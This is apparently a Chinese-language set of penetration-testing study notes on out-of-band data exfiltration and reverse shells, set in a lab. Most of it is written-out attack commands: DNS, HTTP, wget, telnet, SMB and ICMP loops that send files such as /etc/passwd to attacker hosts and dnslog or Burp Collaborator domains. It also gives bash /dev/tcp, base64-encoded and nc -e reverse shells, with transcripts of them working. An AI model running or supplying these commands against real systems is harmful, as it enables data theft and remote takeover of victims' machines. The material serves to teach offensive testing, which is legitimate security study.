假设我们有个可控的二级域名，那么目标发出三级域名解析的时候，我们这边是能够拿到它的域名解析请求的，可以配合DNS请求进行命令执行的判断，这一般被称为dnslog
要通过dns请求即可通过ping命令，也能通过curl命令，只要对域名进行访问，让域名服务器进行域名解析就可实现
例：可以去ceye.io注册个账号，注册完后会给一个域名，如果有域名home解析请求会有记录；如得到的域名是test.ceye.io，当有主机访问1111. test.ceye.io时，就会记录下来这个域名解析请求；其中1111可以替换成我们需要获取的信息；
如：cat /home/1.txt| xxd -p -c 16 | while read exfil; do host $exfil.contextis.com 100.1.1.122; done
上述命令是去DNS服务器100.1.1.122(也可以是dnslog平台--可以查看dns请求报文)查询域名$exfil.contextis.com（实际发包时$exfil会被替换为具体的变量内容）
```

/home/1.txt的内容为hello,hello的ASCII编码为

![image-20220929160011782](http://cdn.ayusummer233.top/img/image-20220929160011782.png)

![在这里插入图片描述](http://cdn.ayusummer233.top/img/20210528092154214.png)

> hostname 域名domain
>
> 此命令会访问默认的DNS服务器查询域名domain的IP
>
> hostname 域名domain IPaddr  
>
> 此命令会访问IP地址为IPaddr的主机（可能是DNS服务器也可能不是）查询域名domain的IP

linux上执行

```
ping -c 1 `whoami`.sp328y.dnslog.cn  #原理：反引号中的命令会自动执行并返回命令执行的结果拼接到命令里，Linux里要加上-c参数指定次数
```

![image-20221010093630509](http://cdn.ayusummer233.top/img/image-20221010093630509.png)

或者

```
host 68656c6c6f0a.zvyi9e7i381n54xz71viphdy1p7fv4.oastify.com 100.1.1.122; done
```

Wireshark在100.1.1.122网卡抓包

![image-20220929173651388](http://cdn.ayusummer233.top/img/image-20220929173651388.png)

如果Burp suit上设置DNSlog服务器，申请子域名

![image-20220929173919781](http://cdn.ayusummer233.top/img/image-20220929173919781.png)

通过Burp Collaborator在公网注册为DNS服务器，然后点击Copy to clopboard获取子域名

linux上执行

```
host 5ag69kgrz1w5vfj6jvrp4zqzxq3gr5.oastify.com  #下面的具体IP是随机生成的
```

![image-20220929174301927](http://cdn.ayusummer233.top/img/image-20220929174301927.png)

任何从公网查询5ag69kgrz1w5vfj6jvrp4zqzxq3gr5.oastify.com域名IP的DNS请求会发送到Burp Collaborator上被其记录：

![image-20220929174204357](http://cdn.ayusummer233.top/img/image-20220929174204357.png)



在攻击机上搭建DNSlog服务器Antenna

git clone https://github.com/wuba/Antenna.git

由于在外网可能无法下载

[eryajf/Thanks-Mirror: 整理记录各个包管理器，系统镜像，以及常用软件的好用镜像，Thanks Mirror。 走过路过，如觉不错，麻烦点个赞👆🌟 (github.com)](https://github.com/eryajf/Thanks-Mirror)里找到[GitHub Proxy 代理加速 (ghproxy.com)](https://ghproxy.com/)

git clone https://ghproxy.com/https://github.com/wuba/Antenna.git

即可下载项目

在目录下

.env.example文件修改为

```
#MYSQL配置
MYSQL_HOST=127.0.0.1
MYSQL_PORT=3306
MYSQL_USERNAME=root
MYSQL_PASSWORD=hillstone

#平台配置
PLATFORM_DOMAIN=test.com
#初始登录用户  密码为antenna@58.com
PLATFORM_ROOT_USER=root@hillstonenet.com


#隐藏后台地址
LOGIN_PATH='aaa'

# DNS解析记录
DNS_DOMAIN=test.cn
NS1_DOMAIN=ns1.test.cn
NS2_DOMAIN=ns2.test.cn
SERVER_IP=100.1.1.121
```

再修改docker-compose.yml(语法很严格 不要随便缩进)

```
version: '3.9'

services:
  db:
    privileged: true
    image: mysql:8.0.30
    container_name: antenna-mysql
    ports:
      - "3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: hillstone
      MYSQL_DATABASE: antenna
    networks:
      - antenna
    restart: always

  antenna:
    # 这里一定要是正确的官方镜像名，否则dockerhub官网找不到就无法下载吗，如果想本地打包镜像可使用该关键字 build: ./
    image: jihongjun/antenna:latest
    pull_policy: always
    depends_on:
      - db
    container_name: antenna
    volumes:
      - ./:/antenna
      - /etc/timezone:/etc/timezone:ro
      - /etc/localtime:/etc/localtime:ro
    ports:
      - "21:21"
      - "80:80"
      - "2345:2345"
      - "53:53/udp"
      - "443:443"
    environment:
      # 平台数据库配置，与上mysql配置保持一致
      MYSQL_HOST: db
      MYSQL_PORT: 3306
      MYSQL_USERNAME: root
      MYSQL_PASSWORD: hillstone

      # 平台配置
      PLATFORM_DOMAIN: test.com
      #登陆页面路径，如设置成abc 则登陆页面地址为http://platform.com/abc
      LOGIN_PATH: ''
      #登陆密码antenna@58.com
      PLATFORM_ROOT_USER: root@hillstonenet.com

      # DNS配置
      DNS_DOMAIN: test.cn
      NS1_DOMAIN: ns1.test.cn
      NS2_DOMAIN: ns2.test.cn
      SERVER_IP: 127.0.0.1

    networks:
      - antenna
    restart: always

networks:
  antenna:
    driver: bridge
```

docker-compose up -d启动（会下载mysql和antenna的镜像后启动）

部署前保证映射端口都未被占用，关于53端口关闭可运行命令

```shell
systemctl stop systemd-resolved
```

如果镜像部署中提示端口开启没有权限，请将docker中关于antenna的镜像增加配置**privileged: true**

部署成功

![image-20220930153926277](http://cdn.ayusummer233.top/img/image-20220930153926277.png)

使用root@hillstone/antenna@58.com登陆  同时只允许一个用户登陆  使用root用户登进去修改

![image-20220930154049047](http://cdn.ayusummer233.top/img/image-20220930154049047.png)

来允许用户注册（这里使用网易的邮箱服务器来允许注册，smtp.qq.com不行）

新用户注册后让rooy账户给他开权限

![image-20220930154225711](http://cdn.ayusummer233.top/img/image-20220930154225711.png)

设置DNS记录域名为test.cn  IP为本机IP（所有DNS请求你返回的IP都会是这个IP）

![image-20220930155157271](http://cdn.ayusummer233.top/img/image-20220930155157271.png)



在任务里增加监听组件（后缀都是test.cn  无法修改  修改记录域名也没用）

![image-20220930155033741](../../../../../AppData/Roaming/Typora/typora-user-images/image-20220930155033741.png)

靶机发起DNS请求  需要带上目标DNS服务器的IP

![image-20220930155716275](http://cdn.ayusummer233.top/img/image-20220930155716275.png)

dnslog外带

docker容器没有host命令需要额外安装

```
apt update && apt -y install iproute2  #可以使用ifconfig命令

apt-get install host
```

```
cat /home/1.txt| xxd -p -c 16 | while read exfil; do host $exfil.lrqN.test.cn 100.1.1.121;done
```

![image-20220930155840779](http://cdn.ayusummer233.top/img/image-20220930155840779.png)

DNSlog服务器得到消息

![image-20220930155917454](http://cdn.ayusummer233.top/img/image-20220930155917454.png)

单纯的host test.cn 即使靶机有回应

![image-20220930160408413](http://cdn.ayusummer233.top/img/image-20220930160408413.png)

DNS平台也没有消息

#### netcat

如果目标系统有安装netcat，可以直接利用netcat将操作系统的标准输出重定向到netcat监听的端口：

```
nc -lp 9999 < /etc/passwd
```

![image-20221010094008263](http://cdn.ayusummer233.top/img/image-20221010094008263.png)

如果目标系统为Windows，利用以下命令：

```bash
type c:\windows\win.ini  | nc -lp 9999
```

#### curl

curl是用于使用各种协议传输数据的库和命令行工具，并且是用于数据渗透的非常有用的工具。如果易受攻击的服务器具有curl，我们可以使用它来将文件发送到恶意Web服务器或使用其他协议（例如FTP / SCP / TFTP / TELNET等）传输文件

- 用http请求的方式携带数据：

```bash
curl nnez6htu165wu7grtc8txkm24tajy8.burpcollaborator.net/`whoami`  #实际的请求是nnez6htu165wu7grtc8txkm24tajy8.burpcollaborator.net/www-data
```

![img](https://upload-images.jianshu.io/upload_images/21474770-058275c98be71d15.png?imageMogr2/auto-orient/strip|imageView2/2/w/550/format/webp)

**注意：这里如果要使用ls命令查看当前目录文件，会发现只有一个请求，也就是说只能查看到1个文件或者目录**

经过查资料后，发现如空格、!、$、&、?等特殊字符，是无法通过DNSlog将数据携带出来。所有我们要让内容先进行base64编码，然后在进行输出

```
curl nnez6htu165wu7grtc8txkm24tajy8.burpcollaborator.net/`ls|base64`
```

但是这种方法有一个缺陷：
**DNS每一级域名长度的限制是63个字符，如果文件内容过多，导致生成的base64太长，域名无法全部携带出来**

![img](https://upload-images.jianshu.io/upload_images/21474770-8cd8d565e1370804.png?imageMogr2/auto-orient/strip|imageView2/2/w/957/format/webp)

这里我们可以通过一个For循环，将每个文件逐条输出：

```
for i in $(ls);do curl "http://nnez6htu165wu7grtc8txkm24tajy8.burpcollaborator.net/$i";done
```

![img](https://upload-images.jianshu.io/upload_images/21474770-b3f4e343f752ae45.png?imageMogr2/auto-orient/strip|imageView2/2/w/607/format/webp)

这里我们也可以选择在自己的VPS（虚拟专用服务器）上开放Web服务，用于获取数据：

![img](https://upload-images.jianshu.io/upload_images/21474770-5f687d57c8ff2f5a.png?imageMogr2/auto-orient/strip|imageView2/2/w/848/format/webp)

当然这里还可以再完善一点，可以自己写个脚本，然后使用正则将其内容全部提取出来

- 使用以下命令将文件的内容发送到我们的web服务器：

```
cat /etc/passwd | curl –F “:data=@-“ http://xxx.xxx.xxx.xxxx:xxxx/ceshi.txt  #（-F提交表单数据到ceshi.txt文件）
 -F, --form <name=content> Specify multipart MIME data
     --form-string <name=string> Specify multipart MIME data
     --ftp-account <data> Account data string
     --ftp-alternative-to-user <command> String to replace USER [name]
     --ftp-create-dirs Create the remote dirs if not present
     --ftp-method <method> Control CWD usage
     --ftp-pasv      Use PASV/EPSV instead of PORT

```

web服务器监听：

![image-20221010095543931](http://cdn.ayusummer233.top/img/image-20221010095543931.png)

- 通过FTP传输文件：

```
curl –T {path to file} ftp://xxx.xxx.xxx.xxx –user :{password}
 -T, --upload-file <file> Transfer local FILE to destination
     --url <url>     URL to work with
```

#### wget

wget主要用于从web上非交互式地下载文件,但是，它同样可以用来外带数据

利用原理：wget支持自定义请求头，把敏感数据放入请求头里带出来

```
wget --header="book4yi:`cat /etc/passwd | xargs echo -n`" http://x.x.x.x:x
```

![image-20221010101017794](http://cdn.ayusummer233.top/img/image-20221010101017794.png)

除此之外，wget可以利用--post-data选项用来提交body，--post-file用来上传文件

```
wget --post-file=/etc/passwd  http://x.x.x.x:x
```

![image-20221010101041272](http://cdn.ayusummer233.top/img/image-20221010101041272.png)

#### SMB

如果漏洞服务器是windows系统，我们可以使用网络共享功能读取文件

利用原理：让存在漏洞的服务器连接到我们自己开设的共享上，然后向我们的共享文件夹复制文件

打开本机（攻击机）网络共享：

![image-20221010101636855](http://cdn.ayusummer233.top/img/image-20221010101636855.png)

选择需要开放的共享文件夹或者磁盘：

![image-20221010101715403](http://cdn.ayusummer233.top/img/image-20221010101715403.png)

通过让漏洞服务器执行命令，向我们的共享文件夹复制文件：

```
net use e: \\Sws-win10\e /user:tester_sws && copy d:\1.txt e:\book4yi.txt
```

![image-20221010102301036](http://cdn.ayusummer233.top/img/image-20221010102301036.png)

#### TELNET

```
telnet x.x.x.x {port} < /etc/passwd
```

#### ICMP

如果目标系统是linux,我们可以使用ICMP协议的echo requests外带数据，在linux下，可以用ping命令的-p选项实现

但是-p选项外带的数据最多只能16字节，这时可以利用xxd命令，不过这个命令在一些系统里是没有默认安装的

```
cat /etc/passwd | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 x.x.x.x; done (-p是将数据--解析为16进制填充到padding中)
```

![image-20221010174054526](http://cdn.ayusummer233.top/img/image-20221010174054526.png)

```
root@hillstone-virtual-machine:~# ping -h
Usage
  ping [options] <destination>

Options:
  <destination>      dns name or ip address
  -a                 use audible ping
  -A                 use adaptive ping
  -B                 sticky source address
  -c <count>         stop after <count> replies
  -D                 print timestamps
  -d                 use SO_DEBUG socket option
  -f                 flood ping
  -h                 print help and exit
  -I <interface>     either interface name or address
  -i <interval>      seconds between sending each packet
  -L                 suppress loopback of multicast packets
  -l <preload>       send <preload> number of packages while waiting replies
  -m <mark>          tag the packets going out
  -M <pmtud opt>     define mtu discovery, can be one of <do|dont|want>
  -n                 no dns name resolution
  -O                 report outstanding replies
  -p <pattern>       contents of padding byte
  -q                 quiet output
  -Q <tclass>        use quality of service <tclass> bits
  -s <size>          use <size> as number of data bytes to be sent
  -S <size>          use <size> as SO_SNDBUF socket option value
  -t <ttl>           define time to live
  -U                 print user-to-user latency
  -v                 verbose output
  -V                 print version and exit
  -w <deadline>      reply wait <deadline> in seconds
  -W <timeout>       time to wait for response

IPv4 options:
  -4                 use IPv4
  -b                 allow pinging broadcast
  -R                 record route
  -T <timestamp>     define timestamp, can be one of <tsonly|tsandaddr|tsprespec>

IPv6 options:
  -6                 use IPv6
  -F <flowlabel>     define flow label, default is random
  -N <nodeinfo opt>  use icmp6 node info query, try <help> as argument

For more details see ping(8).
```

使用wireshark抓包查看：

![image-20221010102705714](http://cdn.ayusummer233.top/img/image-20221010102705714.png)

在vps上使用tcpdump进行监听：

![image-20221010102842063](http://cdn.ayusummer233.top/img/image-20221010102842063.png)

```
ping -c 4 192.168.1.222 -p `cat /etc/hostname|xxd -p `  //将命令cat /etc/hostname|xxd -p的输出放在原来`cat /etc/hostname|xxd -p`的位置，结尾没有换行所以正常执行

ping -c 4 192.168.1.222 -p `cat /etc/hostname|xxd -p -c 16 `//将命令cat /etc/hostname|xxd -p -c 的输出放在原来`cat /etc/hostname|xxd -p`的位置,由于xxd -p -c 16指明每行显示16个字符的16进制编码，16个满了会换行，所以命令执行的时候会报错ping: 6c2d6d616368696e650a: 域名解析暂时失败
```

![image-20221010183514416](../../../../../AppData/Roaming/Typora/typora-user-images/image-20221010183514416.png)

#### 反弹shell

监听端监听

```
nc -L -p 9090-e cmd.exe (Windows)
nc -l -p 9090-e /bin/bash (*nix)
```

见Tips.md

[反弹shell原理与实现 - iouwenbo - 博客园 (cnblogs.com)](https://www.cnblogs.com/iouwenbo/p/11277453.html#:~:text=反弹shell（reverse,shell），就是控制端监听在某TCP%2FUDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。)

[反弹shell的方法总结 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/247967.html)

反弹shell（reverse shell），就是控制端监听某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。

##### 为什么要反弹sehll

通常用于被控端因防火墙受限、权限不足、端口被占用等情形。

举例：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。那么什么情况下正向连接不能用了呢？

有如下情况：

1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。 

2.目标机器的ip动态改变，你不能持续控制。

3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。

4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。

那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。

*参考：*

 [知乎：反弹shell是什么意思啊？网上看了半天都没有相关的基础的解释?](*https://www.zhihu.com/question/24503813 )

##### 反弹shell具体举例及解释

受害者生成反弹shell：**bash -i >& /dev/tcp/10.201.61.194/9001 0>&1**   攻击者监听端口：nc -lvp 9001

nv -lvp 9001

-l listen监听，-v 输出交互或出错信息，-p 端口。nc是netcat的简写，可实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口。

bash -i

-i interactive 即产生一个交互式的Shell（bash）

/dev/tcp/IP/PORT

特殊设备文件（Linux一切皆文件），实际上这个文件并不存在，它只是bash实现的用来实现网络请求的一个接口，打开这个文件就相当于发出一个socket调用并建立一个socket连接，读写这个文件，就相当于在这个socket连接中传输数据。

受害者执行的不同反弹shell的效果:

>1.攻击端监听一个端口：
>
>[root@hacker ~]# **nc -lvp 6767**
>
>*Ncat: Version 7.50 ( https://nmap.org/ncat )*
>
>*Ncat: Listening on :::6767*
>
>*Ncat: Listening on 0.0.0.0:6767*
>
>2.受害端生成一个反弹shell：
>
>[root@victim ~]# **bash -i >& /dev/tcp/10.201.61.194/6767 0>&1**   
>
>3.攻击端已获取到受害端的bash：
>
>[root@hacker ~]# nc -lvp 6767
>
>*Ncat: Version 7.50 ( https://nmap.org/ncat )*
>
>*Ncat: Listening on :::6767*
>
>*Ncat: Listening on 0.0.0.0:6767*
>
>*Ncat: Connection from 10.201.61.195.*
>
>*Ncat: Connection from 10.201.61.195:46836.*
>
>[root@victim ~]#     //攻击端已获得受害端的远程交互式shell
>
>[root@victim ~]# hostname
>
>hostname   //攻击端获得此连接的受害机的输入和回显
>
>victim

测试1：

>受害端：
>
>[root@victim ~]# bash -i > /dev/tcp/10.201.61.194/5566    // >表示此交互bash的输出重向到文件/dev/tcp/10.201.61.194/5566
>[root@victim ~]# hostname    
>[root@victim ~]#
>
>攻击端：
>
>[root@hacker ~]# nc -lvp 5566   //第一步
>
>Ncat: Version 7.50 ( https://nmap.org/ncat )
>Ncat: Listening on :::5566
>Ncat: Listening on 0.0.0.0:5566
>Ncat: Connection from 10.201.61.195.
>Ncat: Connection from 10.201.61.195:49018.
>
>victim   //测试1结果：实现了将受害端的标准输出重定向到攻击端，但是还没实现用命令控制受害端。

测试2：

>受害端：
>
>[root@victim ~]# bash -i < /dev/tcp/10.201.61.194/5566    //<表示件/dev/tcp/10.201.61.194/5566内容重向到此交互bash的输入
>[root@victim ~]# hostname    //测试2结果：实现了将攻击端的输入重定向到受害端，但是攻击端看不到命令执行结果。
>victim
>
> 攻击端：
>
>[root@hacker ~]# nc -lvp 5566    //第一步
>Ncat: Version 7.50 ( https://nmap.org/ncat )
>Ncat: Listening on :::5566
>Ncat: Listening on 0.0.0.0:5566
>Ncat: Connection from 10.201.61.195.
>Ncat: Connection from 10.201.61.195:50412.
>hostname    //第三步（攻击端执行命令）向socket写入相当于

测试3：

>受害端：
>
>[root@victim ~]# bash -i > /dev/tcp/10.201.61.194/5566 0>&1    // >表示此交互bash的输出重向到文件/dev/tcp/10.201.61.194/5566即输出都是向文件写   且此bash标准输入0从定向到标准输出1（前面输出重定向到文件了）即输入就是从输出里读（又因为此前已经将输出定向了，此处就是从文件里读）
>[root@victim ~]# hostname    //受害端回显命令  （没有输出，输出重定向到文件了）
>[root@victim ~]# id    //受害端回显命令
>[root@victim ~]# hahaha    //受害端回显命令
>bash: hahaha: command not found    //受害端回显命令。显示错误命令的输出。
>[root@victim ~]#
>
> 攻击端：
>
>[root@hacker ~]# nc -lvp 5566    //第一步
>Ncat: Version 7.50 ( https://nmap.org/ncat )
>Ncat: Listening on :::5566
>Ncat: Listening on 0.0.0.0:5566
>Ncat: Connection from 10.201.61.195.
>Ncat: Connection from 10.201.61.195:36792.
>hostname    //第三步（攻击端执行命令）向socket写入
>victim
>id    //第四步（攻击端执行命令）
>uid=0(root) gid=0(root) groups=0(root)   socket的内容作为回显
>hahaha    //第五步（执行一个错误的命令）
>
>//测试3结果：基本实现了反弹shell的功能。但是受害端的机器上依然回显了攻击者机器上执行的命令，且攻击端看不到错误命令的输出。

`0>&1` 把标准输入重定向到标准输出

`>&和&>`[文件名或文件描述符]     这两个符号的含义是把标准错误和标准输出重定向到文件

测试4：

>受害端：
>
>[root@victim ~]# bash -i > /dev/tcp/10.201.61.194/5566 0>&1 2>&1    //或  bash -i &> /dev/tcp/10.201.61.194/5566 0>&1 （注：&>或>& 表示混合输出，即标准输出1 + 错误输出2）   >表示此交互bash的输出重向到文件/dev/tcp/10.201.61.194/5566即输出都是向文件写   且此bash标准输入0从定向到标准输出1（前面输出重定向到文件了）即输入就是从输出里读（又因为此前已经将输出定向了，此处就是从文件里读）  此bash的标准错误重定向到标准输出，向此bash标准错误写的内容都会被从重定向到标准输出（此处标准输出也被重定向了）
>
>攻击端：
>
>[root@hacker ~]# nc -lvp 5566    //第一步
>Ncat: Version 7.50 ( https://nmap.org/ncat )
>Ncat: Listening on :::5566
>Ncat: Listening on 0.0.0.0:5566
>Ncat: Connection from 10.201.61.195.
>Ncat: Connection from 10.201.61.195:51182.
>[root@victim ~]# hostname    //第三步。测试4结果：攻击端已获得受害端的远程交互式shell，而且受害端没有再回显攻击端输入的命令~
>hostname
>victim
>
>//PS：由测试3、测试4对比可见，标准错误2不仅显示错误信息的作用，居然还有回显输入命令和终端提示符的作用

##### Linux下反弹shell

##### 1.bash反弹

```bash
bash -i >& /dev/tcp/192.168.2.102/7777 0>&1
```

特殊情况下可以使用base 64编码执行bash反弹shell

编码地址：http://www.jackson-t.ca/runtime-exec-payloads.html

[java.lang.Runtime.exec() Payload Workarounds - @Jackson_T (bewhale.github.io)](https://bewhale.github.io/tools/encode.html)

```bash
bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMTAyLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}'
```

|{base64,-d}表示将|前的命令执行后的输出作为后面命令发的输入，执行base64 -d 。。来对前面命令的输出进行base64解码

在kali中执行会解析成编码前的bash命令

##### 2.nc反弹

kali执行

```bash
nc -e /bin/bash 192.168.2.102 4444
```

-e后面跟的参数代表的是在创建连接后执行的程序文件，这里代表在连接到远程后可以在远程执行一个本地shell(/bin/bash)，也就是反弹一个shell给远程，可以看到远程已经成功反弹到了shell，并且可以执行命令。

kali的nc																														

<img src="http://cdn.ayusummer233.top/img/image-20221008145642988.png" alt="image-20221008145642988" style="zoom:100%;" />

ubuntu的nc

![image-20221008151246358](http://cdn.ayusummer233.top/img/image-20221008151246358.png)

kali:(无法执行命令，会在连接断开后执行)

![image-20221008151743067](http://cdn.ayusummer233.top/img/image-20221008151743067.png)

ubuntu监听端口：（执行的命令会执行在kali端，执行结果显示在ubuntu输出上）  nc -lvp 9001会报错 getnameinfo: Temporary failure in name resolution

意思是[域名解析](https://so.csdn.net/so/search?q=域名解析&spm=1001.2101.3001.7020)失败，但是DNS什么的设置没有问题，其实是主机名解析失败，在hosts里配置一下即可解决:

vi /etc/hosts  增加[主机名](https://so.csdn.net/so/search?q=主机名&spm=1001.2101.3001.7020)映射127.0.0.1 hostname(主机名)  

或者直接禁止主机名及端口解析 -lvnp

![image-20221008151639906](http://cdn.ayusummer233.top/img/image-20221008151639906.png)

kali执行nc -c ls 192.168.1.221 9001 连接建立后执行ls，将执行结果返回给远程

![image-20221008151102234](http://cdn.ayusummer233.top/img/image-20221008151102234.png)

ubuntu监听端口9001:得到

![image-20221008151018280](http://cdn.ayusummer233.top/img/image-20221008151018280.png)

##### 3.curl反弹

curl是用于使用各种协议传输数据的库和命令行工具，并且是用于数据渗透的非常有用的工具。如果易受攻击的服务器具有curl，我们可以使用它来将文件发送到恶意Web服务器或使用其他协议（例如FTP / SCP / TFTP / TELNET等）传输文件

kali:

![image-20221008152845311](http://cdn.ayusummer233.top/img/image-20221008152845311.png)

ubuntu:

```bash
Usage: curl [options...] <url>
     --abstract-unix-socket <path> Connect via abstract Unix domain socket
     --alt-svc <file name> Enable alt-svc with this cache file
     --anyauth       Pick any authentication method
 -a, --append        Append to target file when uploading
     --basic         Use HTTP Basic Authentication
     --cacert <file> CA certificate to verify peer against
     --capath <dir>  CA directory to verify peer against
 -E, --cert <certificate[:password]> Client certificate file and password
     --cert-status   Verify the status of the server certificate
     --cert-type <type> Certificate file type (DER/PEM/ENG)
     --ciphers <list of ciphers> SSL ciphers to use
     --compressed    Request compressed response
     --compressed-ssh Enable SSH compression
 -K, --config <file> Read config from a file
     --connect-timeout <seconds> Maximum time allowed for connection
     --connect-to <HOST1:PORT1:HOST2:PORT2> Connect to host
 -C, --continue-at <offset> Resumed transfer offset
 -b, --cookie <data|filename> Send cookies from string/file
 -c, --cookie-jar <filename> Write cookies to <filename> after operation
     --create-dirs   Create necessary local directory hierarchy
     --crlf          Convert LF to CRLF in upload
     --crlfile <file> Get a CRL list in PEM format from the given file
 -d, --data <data>   HTTP POST data
     --data-ascii <data> HTTP POST ASCII data
     --data-binary <data> HTTP POST binary data
     --data-raw <data> HTTP POST data, '@' allowed
     --data-urlencode <data> HTTP POST data url encoded
     --delegation <LEVEL> GSS-API delegation permission
     --digest        Use HTTP Digest Authentication
 -q, --disable       Disable .curlrc
     --disable-eprt  Inhibit using EPRT or LPRT
     --disable-epsv  Inhibit using EPSV
     --disallow-username-in-url Disallow username in url
     --dns-interface <interface> Interface to use for DNS requests
     --dns-ipv4-addr <address> IPv4 address to use for DNS requests
     --dns-ipv6-addr <address> IPv6 address to use for DNS requests
     --dns-servers <addresses> DNS server addrs to use
     --doh-url <URL> Resolve host names over DOH
 -D, --dump-header <filename> Write the received headers to <filename>
     --egd-file <file> EGD socket path for random data
     --engine <name> Crypto engine to use
     --etag-save <file> Get an ETag from response header and save it to a FILE
     --etag-compare <file> Get an ETag from a file and send a conditional request
     --expect100-timeout <seconds> How long to wait for 100-continue
 -f, --fail          Fail silently (no output at all) on HTTP errors
     --fail-early    Fail on first transfer error, do not continue
     --false-start   Enable TLS False Start
 -F, --form <name=content> Specify multipart MIME data
     --form-string <name=string> Specify multipart MIME data
     --ftp-account <data> Account data string
     --ftp-alternative-to-user <command> String to replace USER [name]
     --ftp-create-dirs Create the remote dirs if not present
     --ftp-method <method> Control CWD usage
     --ftp-pasv      Use PASV/EPSV instead of PORT
 -P, --ftp-port <address> Use PORT instead of PASV
     --ftp-pret      Send PRET before PASV
     --ftp-skip-pasv-ip Skip the IP address for PASV
     --ftp-ssl-ccc   Send CCC after authenticating
     --ftp-ssl-ccc-mode <active/passive> Set CCC mode
     --ftp-ssl-control Require SSL/TLS for FTP login, clear for transfer
 -G, --get           Put the post data in the URL and use GET
 -g, --globoff       Disable URL sequences and ranges using {} and []
     --happy-eyeballs-timeout-ms <milliseconds> How long to wait in milliseconds for IPv6 before trying IPv4
     --haproxy-protocol Send HAProxy PROXY protocol v1 header
 -I, --head          Show document info only
 -H, --header <header/@file> Pass custom header(s) to server
 -h, --help          This help text
     --hostpubmd5 <md5> Acceptable MD5 hash of the host public key
     --http0.9       Allow HTTP 0.9 responses
 -0, --http1.0       Use HTTP 1.0
     --http1.1       Use HTTP 1.1
     --http2         Use HTTP 2
     --http2-prior-knowledge Use HTTP 2 without HTTP/1.1 Upgrade
     --http3         Use HTTP v3
     --ignore-content-length Ignore the size of the remote resource
 -i, --include       Include protocol response headers in the output
 -k, --insecure      Allow insecure server connections when using SSL
     --interface <name> Use network INTERFACE (or address)
 -4, --ipv4          Resolve names to IPv4 addresses
 -6, --ipv6          Resolve names to IPv6 addresses
 -j, --junk-session-cookies Ignore session cookies read from file
     --keepalive-time <seconds> Interval time for keepalive probes
     --key <key>     Private key file name
     --key-type <type> Private key file type (DER/PEM/ENG)
     --krb <level>   Enable Kerberos with security <level>
     --libcurl <file> Dump libcurl equivalent code of this command line
     --limit-rate <speed> Limit transfer speed to RATE
 -l, --list-only     List only mode
     --local-port <num/range> Force use of RANGE for local port numbers
 -L, --location      Follow redirects
     --location-trusted Like --location, and send auth to other hosts
     --login-options <options> Server login options
     --mail-auth <address> Originator address of the original email
     --mail-from <address> Mail from this address
     --mail-rcpt <address> Mail to this address
 -M, --manual        Display the full manual
     --max-filesize <bytes> Maximum file size to download
     --max-redirs <num> Maximum number of redirects allowed
 -m, --max-time <seconds> Maximum time allowed for the transfer
     --metalink      Process given URLs as metalink XML file
     --negotiate     Use HTTP Negotiate (SPNEGO) authentication
 -n, --netrc         Must read .netrc for user name and password
     --netrc-file <filename> Specify FILE for netrc
     --netrc-optional Use either .netrc or URL
 -:, --next          Make next URL use its separate set of options
     --no-alpn       Disable the ALPN TLS extension
 -N, --no-buffer     Disable buffering of the output stream
     --no-keepalive  Disable TCP keepalive on the connection
     --no-npn        Disable the NPN TLS extension
     --no-progress-meter Do not show the progress meter
     --no-sessionid  Disable SSL session-ID reusing
     --noproxy <no-proxy-list> List of hosts which do not use proxy
     --ntlm          Use HTTP NTLM authentication
     --ntlm-wb       Use HTTP NTLM authentication with winbind
     --oauth2-bearer <token> OAuth 2 Bearer Token
 -o, --output <file> Write to file instead of stdout
 -Z, --parallel      Perform transfers in parallel
     --parallel-immediate Do not wait for multiplexing (with --parallel)
     --parallel-max  Maximum concurrency for parallel transfers
     --pass <phrase> Pass phrase for the private key
     --path-as-is    Do not squash .. sequences in URL path
     --pinnedpubkey <hashes> FILE/HASHES Public key to verify peer against
     --post301       Do not switch to GET after following a 301
     --post302       Do not switch to GET after following a 302
     --post303       Do not switch to GET after following a 303
     --preproxy [protocol://]host[:port] Use this proxy first
 -#, --progress-bar  Display transfer progress as a bar
     --proto <protocols> Enable/disable PROTOCOLS
     --proto-default <protocol> Use PROTOCOL for any URL missing a scheme
     --proto-redir <protocols> Enable/disable PROTOCOLS on redirect
 -x, --proxy [protocol://]host[:port] Use this proxy
     --proxy-anyauth Pick any proxy authentication method
     --proxy-basic   Use Basic authentication on the proxy
     --proxy-cacert <file> CA certificate to verify peer against for proxy
     --proxy-capath <dir> CA directory to verify peer against for proxy
     --proxy-cert <cert[:passwd]> Set client certificate for proxy
     --proxy-cert-type <type> Client certificate type for HTTPS proxy
     --proxy-ciphers <list> SSL ciphers to use for proxy
     --proxy-crlfile <file> Set a CRL list for proxy
     --proxy-digest  Use Digest authentication on the proxy
     --proxy-header <header/@file> Pass custom header(s) to proxy
     --proxy-insecure Do HTTPS proxy connections without verifying the proxy
     --proxy-key <key> Private key for HTTPS proxy
     --proxy-key-type <type> Private key file type for proxy
     --proxy-negotiate Use HTTP Negotiate (SPNEGO) authentication on the proxy
     --proxy-ntlm    Use NTLM authentication on the proxy
     --proxy-pass <phrase> Pass phrase for the private key for HTTPS proxy
     --proxy-pinnedpubkey <hashes> FILE/HASHES public key to verify proxy with
     --proxy-service-name <name> SPNEGO proxy service name
     --proxy-ssl-allow-beast Allow security flaw for interop for HTTPS proxy
     --proxy-tls13-ciphers <list> TLS 1.3 ciphersuites for proxy (OpenSSL)
     --proxy-tlsauthtype <type> TLS authentication type for HTTPS proxy
     --proxy-tlspassword <string> TLS password for HTTPS proxy
     --proxy-tlsuser <name> TLS username for HTTPS proxy
